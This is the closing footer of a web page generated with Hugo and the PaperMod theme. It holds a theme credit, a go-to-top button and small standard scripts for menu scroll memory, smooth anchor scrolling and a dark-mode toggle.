<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>